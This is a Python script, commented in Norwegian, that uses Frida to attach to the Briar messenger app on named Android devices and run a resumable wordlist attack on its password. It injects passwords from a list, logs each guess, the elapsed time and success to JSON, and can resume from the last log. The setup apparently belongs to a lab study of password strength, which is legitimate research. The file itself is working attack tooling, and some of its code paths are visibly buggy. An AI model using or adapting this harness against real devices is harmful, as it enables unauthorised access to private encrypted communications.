import frida
import sys
import argparse
import subprocess
import configparser
import os
import json  # For å håndtere JSON-logg
from datetime import datetime, timedelta
import time  # For time.sleep()

# Legg til Ressurser-mappen til sys.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../ressurser')))
from briar_verktøy import start_briar

# Funksjon for å lese enhetskart fra enheter.conf
def read_device_map(config_file):
    config = configparser.ConfigParser()
    config.read(config_file)
    device_map = {}

    # Les alle enhetene fra konfigurasjonsfilen basert på seksjonene
    for section in config.sections():
        device_info = {
            'id': config.get(section, 'id'),
            'passord': config.get(section, 'passord'),
            'passordstyrke': config.get(section, 'passordstyrke'),
            'type': config.get(section, 'type')
        }
        device_map[section] = device_info
    
    return device_map

# Funksjon for å hente enhets-ID fra device_map basert på navn
def get_device_id(device_name, device_map):    
    device_info = device_map.get(device_name)
    
    if device_info is None:
        print(f"Enhet {device_name} ble ikke funnet i device_map.")
        return None
    return device_info['id']  # Returner ID-en

# Funksjon for å lese passord fra fil
def read_passwords(file_path):
    with open(file_path, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
    return passwords

# Funksjon for å opprette en JSON-loggfil og lagre status
def create_log_file(device_name, device_id):
    log_dir = f"./status/{device_name}"
    os.makedirs(log_dir, exist_ok=True)
    
    now = datetime.now().isoformat(timespec='seconds').replace(':', '-')
    log_file_name = f"{now}-{device_name}-{device_id}.json"
    log_file_path = os.path.join(log_dir, log_file_name)

    return log_file_path

def get_latest_log_file(device_name):
    log_dir = f"./status/{device_name}"
    if not os.path.exists(log_dir):
        return None, 0, timedelta(0)  # Returner 0 og 0 tid brukt hvis ingen loggfil finnes
    
    log_files = [f for f in os.listdir(log_dir) if f.endswith('.json')]
    if not log_files:
        return None, 0, timedelta(0)  # Ingen loggfiler tilgjengelig
    
    latest_log_file = max(log_files, key=lambda f: os.path.getmtime(os.path.join(log_dir, f)))
    log_file_path = os.path.join(log_dir, latest_log_file)

    # Les loggfilen og hent siste passordnummer og tid brukt
    try:
        with open(log_file_path, 'r') as f:
            data = json.load(f)
            gjettet_passordnummer = data.get("gjettet_passordnummer", 0)
            antall_gjenopptakelser = data.get("antall_gjenopptakelser", 0)
            tid_brukt_str = data.get("tid_brukt", "0:00:00")  # Bruk standardverdi hvis tid_brukt er None eller mangler

            if tid_brukt_str is None:
                tid_brukt_str = "0:00:00"  # Ekstra sjekk hvis None fortsatt oppstår

            # Behandle tid brukt (kan inkludere desimaler for sekunder)
            parts = tid_brukt_str.split(":")
            if len(parts) == 3:
                hours, minutes, seconds = int(parts[0]), int(parts[1]), float(parts[2])
                tid_brukt = timedelta(hours=hours, minutes=minutes, seconds=seconds)
            else:
                tid_brukt = timedelta(0)  # Standardverdi hvis formatet er feil
            return log_file_path, gjettet_passordnummer, tid_brukt, antall_gjenopptakelser
    except (json.JSONDecodeError, KeyError, ValueError) as e:
        print(f"Feil ved lesing av loggfil: {e}")
        return None, 0, timedelta(0)  # Returner 0 hvis loggfilen er tom, korrupt eller mangler felt

def format_timedelta(tid_brukt):
    total_seconds = int(tid_brukt.total_seconds())
    hours, remainder = divmod(total_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{hours:02}:{minutes:02}:{seconds:02}"

# Funksjon for å skrive status til en JSON-loggfil
def write_json_log(log_file, passordnummer, passord, tid_brukt=None, passordfil=None, status="ikke startet"):
    data = {
        "passordfil": passordfil,
        "status": status,
        "antall_gjenopptakelser": antall_gjenopptakelser,
        "tid_brukt": format_timedelta(tid_brukt) if tid_brukt else None,  # Bruk formatert tid her
        "gjettet_passordnummer": passordnummer,
        "gjettet_passord": passord
    }

    with open(log_file, 'w') as f:  # Overskriver filen hver gang
        json.dump(data, f, indent=4)

# Funksjon for å beregne tid brukt
def calculate_time_spent(start_time):
    end_time = datetime.now()
    return end_time - start_time

# Funksjon for å håndtere meldinger fra Frida-skriptet
def on_message(message, data):
    global script_done, exit_code, log_file, passwords, passord, passordNummer, passordfil, start_time, forsøk_start, accumulated_time
    
    if 'start_time' not in globals():
        start_time = datetime.now()  # Hvis start_time ikke er satt

    # Beregn total tid brukt så langt (inkludert tidligere tid fra loggfilen)
    total_time = calculate_time_spent(start_time) + accumulated_time

    if message['type'] == 'send':
        payload = message['payload']

        # Sjekk om meldingen er av typen 'status'
        if payload['type'] == 'status':
            passordNummer = payload['message']['passordNummer']
            passord = payload['message']['passord']
            status = payload['message']['status']

            # Juster passordnummeret ved å legge til forsøk_start
            totalt_passordNummer = forsøk_start + passordNummer

            # Lagre til JSON-loggen
            write_json_log(log_file, passord=passord, passordnummer=totalt_passordNummer, passordfil=passordfil, tid_brukt=total_time, status=status)

        # Sjekk om meldingen er av typen 'exit'
        elif payload['type'] == 'exit':  # Når scriptet er ferdig
            script_done = True
            exit_code = 0

            # Angrepet lyktes eller feilet
            status = 'suksess' if payload['message'] == 'suksess' else 'feilet'

            # Lagre sluttstatus til JSON-loggen
            write_json_log(log_file, passord=passord, passordnummer=forsøk_start + passordNummer, passordfil=passordfil, tid_brukt=total_time, status=status)

        # Sjekk om meldingen er av typen 'error'
        elif payload['type'] == 'error':  # Feilmeldinger
            print(f"Feilmelding mottatt: {payload['message']}")
            exit_code = 1
            script_done = True

    elif message['type'] == 'error':  # Feil i Frida-skriptet
        exit_code = 1
        script_done = True


# Hovedfunksjon for å kjøre angrepet
def main(script_file, password_file, device_name, config_file, gjenoppta, loggfil):
    global log_file, forsøk_start, passwords, script_done, passordfil, start_time, accumulated_time
    global antall_gjenopptakelser
    antall_gjenopptakelser = 0
    session = None
    script_done = False  # Initialiser script_done
    forsøk_start = 0  # Initialiser forsøk_start til 0
    start_time = datetime.now()  # Logg starttidspunktet
    accumulated_time = timedelta(0)  # Tidsbruk fra tidligere sesjoner
    passordfil = password_file  # Hold styr på passordfilen for logging
    
    device_map = read_device_map(config_file)
    device_id = get_device_id(device_name, device_map)
    
    if device_id is None:
        print(f"Ukjent enhet: {device_name}.")
        sys.exit(1)
        
    if gjenoppta:
        if loggfil:
            log_file, forsøk_start, accumulated_time, antall_gjenopptakelser = get_latest_log_file(device_name)
        else:
            log_file, forsøk_start, accumulated_time, antall_gjenopptakelser = get_latest_log_file(device_name)
        
        if log_file:
            with open(log_file, 'r') as f:
                log_data = json.load(f)
                status = log_data.get('status', None)
                brukt_passordfil = log_data.get('passordfil', None)
            
            if status == 'i prosess':
                passordfil = brukt_passordfil
                antall_gjenopptakelser += 1  # Inkrementer
                write_json_log(log_file, forsøk_start, None, accumulated_time, passordfil, status)
                print(f"Gjenopptar ordliste-angrep for enhet {device_name} fra loggfil '{log_file}' ved passord {forsøk_start}.")
            else:
                print(f"Kan ikke gjenoppta. Status i loggfilen er '{status}', og angrepet er allerede avsluttet.")
                sys.exit(1)
        else:
            print(f"Kan ikke gjenoppta. Ingen gyldig loggfil funnet for enhet {device_name}.")
            sys.exit(1)

    else:
        log_file = create_log_file(device_name, device_id)
        write_json_log(log_file, None, 0, tid_brukt=timedelta(0), passordfil=passordfil)
        print(f"Starter et nytt ordliste-angrep for enhet {device_name}.")

    try:
        start_briar(device_id)
        passwords = read_passwords(passordfil)

        with open(script_file) as f:
            script_source = f.read()

        device = frida.get_device(device_id)
        session = device.attach("Briar")
        script = session.create_script(script_source)

        script.on('message', on_message)
        script.load()

        # Start passordtesting der vi sluttet sist, eller fra begynnelsen hvis det ikke er noe å gjenoppta
        script.exports_sync.set_password_list(passwords[forsøk_start:])

        while not script_done:
            time.sleep(0.5)

    except SystemExit as e:
        print(f"System avsluttes med kode: {e}")
    except Exception as e:
        print(f"En feil oppstod: {e}")
    finally:
        if session:
            session.detach()
        sys.exit(0)

if __name__ == "__main__":
    # Parse argumentene
    parser = argparse.ArgumentParser(description="Kjør Frida-skript og injiser passord til målapplikasjonen på en spesifikk enhet.")
    
    parser.add_argument('-p', '--passordfil', help="Filsti til passordfilen som skal injiseres", required=True)
    parser.add_argument('-s', '--script', default='injiser-passord.js', help="Frida-skriptfil (default: injiser-passord.js)")
    parser.add_argument('-d', '--device', help="Navn på enheten (Alice, Bob, Charlie, Dave)", required=True)
    parser.add_argument('-c', '--config', default='./../ressurser/enheter.conf', help="Konfigurasjonsfil som inneholder enhetskart (default: enheter.conf)")
    parser.add_argument('-g','--gjenoppta', action='store_true', help="Hvis angitt, gjenopptar testing fra en tidligere loggfil.")
    parser.add_argument('-l','--loggfil', help="Angi hvilken loggfil å gjenoppta fra hvis --gjenoppta er angitt.")

    args = parser.parse_args()

    main(args.script, args.passordfil, args.device, args.config, args.gjenoppta, args.loggfil)